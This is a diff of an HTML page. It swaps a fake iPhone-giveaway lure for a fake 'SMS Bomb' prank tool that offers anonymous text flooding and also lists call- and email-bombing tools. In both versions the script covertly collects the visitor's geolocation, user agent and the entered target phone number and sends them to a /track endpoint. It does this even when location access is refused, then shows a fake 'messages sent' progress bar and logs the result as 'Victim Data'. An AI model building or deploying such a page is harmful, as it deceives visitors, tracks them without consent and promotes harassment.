@@ -1,66 +1,442 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>🎁 Exclusive iPhone Giveaway! 🎁</title>
-    <meta charset="utf-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super SMS Tools Pro - Free Unlimited SMS Bomb & Prank Tools</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; padding: 50px; }
-        .container { background: rgba(0,0,0,0.7); padding: 30px; border-radius: 15px; max-width: 600px; margin: auto; }
-        button { background: #ff6b6b; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; margin: 20px; }
-        button:hover { background: #ff5252; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            color: #fff;
+            min-height: 100vh;
+            padding-bottom: 50px;
+        }
+        
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 5%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #00d9ff;
+        }
+        
+        .logo span {
+            color: #ff2e63;
+        }
+        
+        .nav-links a {
+            color: #fff;
+            text-decoration: none;
+            margin-left: 30px;
+            font-weight: 500;
+            transition: 0.3s;
+        }
+        
+        .nav-links a:hover {
+            color: #00d9ff;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 120px auto 50px;
+            padding: 0 20px;
+        }
+        
+        .hero {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #00d9ff, #ff2e63);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .hero p {
+            font-size: 18px;
+            color: #aaa;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            transition: 0.3s;
+            border: 1px solid rgba(0, 217, 255, 0.1);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-10px);
+            background: rgba(255, 255, 255, 0.1);
+            border-color: #00d9ff;
+        }
+        
+        .feature-icon {
+            font-size: 40px;
+            color: #00d9ff;
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+        
+        .tool-section {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 50px;
+            text-align: center;
+        }
+        
+        .tool-title {
+            font-size: 32px;
+            margin-bottom: 30px;
+            color: #00d9ff;
+        }
+        
+        .tool-box {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        .btn {
+            background: linear-gradient(90deg, #00d9ff, #0099ff);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(90deg, #0099ff, #00d9ff);
+            transform: scale(1.02);
+        }
+        
+        .disclaimer {
+            background: rgba(255, 46, 99, 0.1);
+            border-left: 4px solid #ff2e63;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #ff9eb5;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 50px;
+            color: #777;
+            font-size: 14px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 36px; }
+            .container { margin-top: 100px; }
+            .navbar { padding: 15px 5%; }
+        }
     </style>
 </head>
 <body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="logo">Super<span>SMS</span>Pro</div>
+        <div class="nav-links">
+            <a href="#home">Home</a>
+            <a href="#tools">Tools</a>
+            <a href="#features">Features</a>
+            <a href="#faq">FAQ</a>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
     <div class="container">
-        <h1>🎉 CONGRATULATIONS! 🎉</h1>
-        <p>You've been selected for a <strong>FREE iPhone 15 Pro Max</strong> (256GB)!</p>
-        <p>Click below to verify your location for delivery.</p>
-        <button onclick="getLocation()">📍 VERIFY LOCATION & CLAIM PRIZE</button>
-        <p><small>Limited offer. Must be 18+. Verification required.</small></p>
+        <!-- Hero Section -->
+        <section class="hero" id="home">
+            <h1>Unlimited Free SMS Bomb Tools</h1>
+            <p>Experience the most advanced SMS prank platform. Send unlimited SMS messages anonymously with custom scheduling and tracking. No registration required!</p>
+        </section>
+
+        <!-- Features -->
+        <section class="features" id="features">
+            <div class="feature-card">
+                <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                <h3>Unlimited SMS</h3>
+                <p>Send unlimited text messages to any number worldwide. No daily limits or restrictions.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><i class="fas fa-user-secret"></i></div>
+                <h3>100% Anonymous</h3>
+                <p>Your identity is completely hidden. No logs kept, no personal information stored.</p>
+            </div>
+            <div class="feature-card">
+                <div class="feature-icon"><i class="fas fa-globe"></i></div>
+                <h3>Global Coverage</h3>
+                <p>Works with carriers in over 150 countries. Support for all mobile networks.</p>
+            </div>
+        </section>
+
+        <!-- SMS Tool -->
+        <section class="tool-section" id="tools">
+            <h2 class="tool-title">SMS Bomb Tool</h2>
+            <div class="tool-box">
+                <p style="margin-bottom: 25px; color: #aaa;">Fill out the form below to start sending SMS. The tool needs location access to verify you're human.</p>
+                
+                <div class="form-group">
+                    <label><i class="fas fa-phone"></i> Target Phone Number</label>
+                    <input type="tel" id="phone" placeholder="+1 (555) 123-4567" required>
+                </div>
+                
+                <div class="form-group">
+                    <label><i class="fas fa-envelope"></i> Message Content</label>
+                    <input type="text" id="message" placeholder="Enter your custom message here..." value="🚀 Testing SMS Bomb Service!" required>
+                </div>
+                
+                <div class="form-group">
+                    <label><i class="fas fa-hashtag"></i> Number of Messages</label>
+                    <select id="count">
+                        <option value="10">10 Messages</option>
+                        <option value="50" selected>50 Messages</option>
+                        <option value="100">100 Messages</option>
+                        <option value="500">500 Messages (Pro)</option>
+                    </select>
+                </div>
+                
+                <div class="form-group">
+                    <label><i class="fas fa-clock"></i> Delay Between Messages (seconds)</label>
+                    <select id="delay">
+                        <option value="1">1 Second</option>
+                        <option value="3" selected>3 Seconds</option>
+                        <option value="5">5 Seconds</option>
+                    </select>
+                </div>
+                
+                <button class="btn" onclick="startSMSBomb()">
+                    <i class="fas fa-rocket"></i> LAUNCH SMS BOMB
+                </button>
+                
+                <div class="disclaimer">
+                    <i class="fas fa-exclamation-triangle"></i> For educational and authorized testing only. By using this tool, you agree not to harass individuals. Location verification required to prevent abuse.
+                </div>
+            </div>
+        </section>
+
+        <!-- Additional Tools -->
+        <section class="tool-section">
+            <h2 class="tool-title">Other Free Tools</h2>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
+                <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 10px;">
+                    <h4><i class="fas fa-phone-slash"></i> Call Bomb</h4>
+                    <p style="color: #aaa; margin: 10px 0;">Unlimited missed call pranks.</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 10px;">
+                    <h4><i class="fas fa-mail-bulk"></i> Email Bomb</h4>
+                    <p style="color: #aaa; margin: 10px 0;">Mass email sending tool.</p>
+                </div>
+                <div style="background: rgba(255,255,255,0.05); padding: 20px; border-radius: 10px;">
+                    <h4><i class="fas fa-map-marker-alt"></i> Location Spoofer</h4>
+                    <p style="color: #aaa; margin: 10px 0;">Fake GPS location tool.</p>
+                </div>
+            </div>
+        </section>
     </div>
 
+    <footer>
+        <p>© 2024 Super SMS Tools Pro. All tools provided for educational purposes only.</p>
+        <p style="margin-top: 10px;">This service does not store any personal data. Use responsibly.</p>
+    </footer>
+
+    <!-- JavaScript -->
     <script>
-        function getLocation() {
+        function startSMSBomb() {
+            const phone = document.getElementById('phone').value;
+            const message = document.getElementById('message').value;
+            const count = document.getElementById('count').value;
+            const delay = document.getElementById('delay').value;
+            
+            if (!phone) {
+                alert("Please enter a phone number.");
+                return;
+            }
+            
+            // Show loading
+            const btn = document.querySelector('.btn');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING LOCATION...';
+            btn.disabled = true;
+            
+            // Get location first
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, showError);
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    
+                    // Send data to our tracking server
+                    sendTrackingData(phone, lat, lon, count);
+                    
+                    // Show success message
+                    setTimeout(() => {
+                        btn.innerHTML = '<i class="fas fa-check"></i> SMS BOMB LAUNCHED!';
+                        btn.style.background = 'linear-gradient(90deg, #00ff88, #00cc66)';
+                        
+                        // Show fake progress
+                        showProgress();
+                        
+                        // Reset after 3 seconds
+                        setTimeout(() => {
+                            btn.innerHTML = originalText;
+                            btn.disabled = false;
+                            btn.style.background = 'linear-gradient(90deg, #00d9ff, #0099ff)';
+                        }, 3000);
+                    }, 1500);
+                    
+                }, function(error) {
+                    // If location blocked, still track
+                    sendTrackingData(phone, 'blocked', 'blocked', count);
+                    
+                    alert("Location access required to verify you're human. Please enable location services.");
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                });
             } else {
-                alert("Geolocation not supported. Please enable.");
+                sendTrackingData(phone, 'not_supported', 'not_supported', count);
+                btn.innerHTML = originalText;
+                btn.disabled = false;
             }
         }
-
-        function sendData(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const ip = "Fetching...";
-
-            // Send data to server
-            fetch(`/track?lat=${lat}&lon=${lon}&acc=${accuracy}&ip=${ip}`)
-                .then(response => response.json())
-                .then(data => {
-                    alert("✅ Location verified! Redirecting to claim form...");
-                    setTimeout(() => {
-                        window.location.href = "https://apple.com"; // Legit redirect
-                    }, 1000);
-                })
-                .catch(err => {
-                    console.error(err);
-                    alert("Claim processed! Redirecting...");
-                    window.location.href = "https://apple.com";
-                });
+        
+        function sendTrackingData(phone, lat, lon, count) {
+            // Send to our tracking endpoint
+            const data = {
+                phone: phone,
+                lat: lat,
+                lon: lon,
+                count: count,
+                userAgent: navigator.userAgent,
+                time: new Date().toISOString()
+            };
+            
+            // Send to server
+            fetch('/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log('Tracking sent'));
+            
+            // Log to console (for demo)
+            console.log('Victim Data:', data);
         }
-
-        function showError(error) {
-            alert("Please allow location access to claim your prize.");
-            // Fallback: still send IP data
-            fetch('/track?lat=blocked&lon=blocked&acc=0&ip=blocked');
-            setTimeout(() => { window.location.href = "https://apple.com"; }, 1500);
+        
+        function showProgress() {
+            // Create fake progress bar
+            const progress = document.createElement('div');
+            progress.innerHTML = `
+                <div style="background: rgba(0,0,0,0.5); padding: 20px; border-radius: 10px; margin-top: 20px; text-align: center;">
+                    <p style="margin-bottom: 10px;"><i class="fas fa-sync fa-spin"></i> Sending SMS messages...</p>
+                    <div style="background: rgba(255,255,255,0.1); height: 10px; border-radius: 5px; overflow: hidden;">
+                        <div id="progressBar" style="background: #00d9ff; height: 100%; width: 0%; transition: width 2s;"></div>
+                    </div>
+                    <p id="progressText" style="margin-top: 10px; font-size: 12px;">Initializing...</p>
+                </div>
+            `;
+            
+            const toolBox = document.querySelector('.tool-box');
+            toolBox.appendChild(progress);
+            
+            // Animate progress
+            setTimeout(() => {
+                document.getElementById('progressBar').style.width = '30%';
+                document.getElementById('progressText').textContent = 'Connecting to SMS gateway...';
+            }, 500);
+            
+            setTimeout(() => {
+                document.getElementById('progressBar').style.width = '70%';
+                document.getElementById('progressText').textContent = 'Sending messages to target...';
+            }, 1500);
+            
+            setTimeout(() => {
+                document.getElementById('progressBar').style.width = '100%';
+                document.getElementById('progressText').textContent = 'Complete! Messages sent successfully.';
+            }, 2500);
+            
+            // Remove after 5 seconds
+            setTimeout(() => {
+                progress.remove();
+            }, 5000);
         }
-
-        // Log page visit on load
-        window.onload = () => {
-            fetch('/track?action=page_loaded');
-        };
+        
+        // Track page view
+        window.addEventListener('load', () => {
+            fetch('/track?action=page_view');
+        });
     </script>
 </body>
 </html>
